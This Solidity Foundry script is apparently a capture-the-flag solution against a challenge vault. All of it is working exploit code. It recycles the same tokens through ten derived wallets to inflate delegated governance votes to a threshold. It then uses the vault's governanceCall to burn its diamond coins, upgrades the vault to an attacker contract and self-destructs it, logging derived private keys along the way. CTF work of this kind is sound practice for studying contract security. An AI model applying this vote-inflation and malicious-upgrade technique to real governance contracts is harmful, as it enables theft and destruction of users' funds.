// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
// import "forge-ctf/CTFDeployer.sol";

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import "src/Challenge.sol";
import "src/Exploit.sol";

contract DeployExploit is Script {
    Challenge[] public instances;
    Exploit exploit;

    uint256 private playerPrivateKey;
    address private playerWallet;
    address private challengeContractAddress;
    address private vaultFactoryAddress;
    address private vaultAddress;
    address private diamondCoinAddress;
    address private hexensCoinAddress;

    uint256 private constant HEXENS_COINS = 10_000 ether;
    uint256 private constant AUTHORITY_THRESHOLD = 100_000 ether;
    uint256 private constant DIAMONDS = 31_337;
    uint256 private constant NUMBER_OF_WALLETS = 10;

    struct Wallet {
        uint256 privateKey;
        address account;
    }

    Wallet[NUMBER_OF_WALLETS] private wallets;

    function run() public {
        challengeContractAddress = vm.envAddress("CHALLENGE_CONTRACT_ADDRESS");
        playerPrivateKey = vm.envUint("PLAYER_PRIVATE_KEY");
        playerWallet = msg.sender;

        vaultFactoryAddress = IChallenge(challengeContractAddress).vaultFactory();
        vaultAddress = IChallenge(challengeContractAddress).vault();
        diamondCoinAddress = IChallenge(challengeContractAddress).diamond();
        hexensCoinAddress = IChallenge(challengeContractAddress).hexensCoin();

        deploy();
    }

    function deploy() internal returns (Exploit) {
        vm.startBroadcast();
        exploit = new Exploit();
        vm.stopBroadcast();

        delegateRep();
        return exploit;
    }

    /// @dev delegate enough rep to the exploit contract to call governanceCall
    function delegateRep() public {
        // Mint the hexens coins from the challenge contract to the player wallet.
        // We will need them to gain reputation.
        claimHexensFromChallenge(playerWallet);

        // Create new wallets and run the following algorithm:
        // 1. Transfer the originally minted tokens to the new wallet.
        // 2. Use the new wallet reputation to delegate it to the player wallet.
        // 3. Transfer the coins back to the player wallet.
        // The player wallet should have enough reputation to call governanceCall.
        getVotes();

        // Use the Vaults governanceCall to burn the diamond coins.
        // Burning the diamond coins will allow us to upgrade the contract.
        burnGovernance(diamondCoinAddress, DIAMONDS, playerWallet);
        console.log("Successfully burned diamond coins from Vault.");

        // Upgrade the contract to the exploit contract.
        upgradeGovernance(playerWallet);
        console.log("Successfully upgraded to exploit contract");

        // Use the exploit contract to self destruct the vault.
        selfDestructVault(playerWallet);
        console.log("Successfully self destructed vault");
    }

    function getCurrentVotes(address from) public isBroadcasted(from) returns (uint256) {
        return IHex(hexensCoinAddress).getCurrentVotes(playerWallet);
    }

    function claimHexensFromChallenge(address from) public isBroadcasted(from) {
        IChallenge(challengeContractAddress).claim();
    }

    function transfer(address to, uint256 amount, address broadcastingAddress)
        public
        isBroadcasted(broadcastingAddress)
    {
        IHex(hexensCoinAddress).transfer(to, amount);
    }

    function delegateToPlayerWallet(address broadcastingAddress) public isBroadcasted(broadcastingAddress) {
        IHex(hexensCoinAddress).delegate(playerWallet);
    }

    function burnGovernance(address token, uint256 amount, address from) public isBroadcasted(from) {
        bytes memory data = abi.encodeWithSelector(
            IVault.burn.selector,
            token, // Address to send funds
            amount // Amount to send
        );

        IVault(vaultAddress).governanceCall(data);
    }

    function upgradeGovernance(address broadcastingAddress) public isBroadcasted(broadcastingAddress) {
        bytes memory data = abi.encodeWithSelector(IVault.upgradeTo.selector, address(exploit));
        IVault(vaultAddress).governanceCall(data);
    }

    function selfDestructVault(address broadcastingAddress) public isBroadcasted(broadcastingAddress) {
        IVault(vaultAddress).selfDestructVault();
    }

    function createWalletAndTransferRep(uint256 index) public {
        wallets[index] = createWallet(index);
        sendEther(wallets[index], playerWallet);
        transferRepToPlayerWallet(HEXENS_COINS, wallets[index].account);
    }

    function sendEther(Wallet memory wallet, address broadcastingAddress) public isBroadcasted(broadcastingAddress) {
        address payable payableAccount = payable(wallet.account);
        (bool success,) = payableAccount.call{value: 0.001 ether}("");
        require(success, "Failed to send ether");
        console.log("Successfully transfered ether to wallet with privateKey: %s", wallet.privateKey);
    }

    /**
     * @notice Creates a derived wallet by modifying the last byte of the base private key.
     * @param index The index used to derive the new private key (1 to 10).
     * @return Wallet struct containing the derived private key and corresponding address.
     */
    function createWallet(uint256 index) public view returns (Wallet memory) {
        // Derive the new private key by replacing the last byte with the index
        uint256 derivedPrivateKey =
            (playerPrivateKey & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00) | index;

        // Get the corresponding address
        address account = vm.addr(derivedPrivateKey);

        return Wallet(derivedPrivateKey, account);
    }

    function transferRepToPlayerWallet(uint256 amount, address _walletAtIndex) public {
        transfer(_walletAtIndex, amount, playerWallet);
        delegateToPlayerWallet(_walletAtIndex);
        transfer(playerWallet, amount, _walletAtIndex);
    }

    function getVotes() public {
        for (uint256 i = 0; i < NUMBER_OF_WALLETS; i++) {
            createWalletAndTransferRep(i);
        }
        require(getCurrentVotes(playerWallet) == AUTHORITY_THRESHOLD, "Not enough votes");
        console.log("Successfully delegated 100_000 ether to player wallet");
    }

    modifier isBroadcasted(address account) {
        vm.startBroadcast(account);
        _;
        vm.stopBroadcast();
    }
}
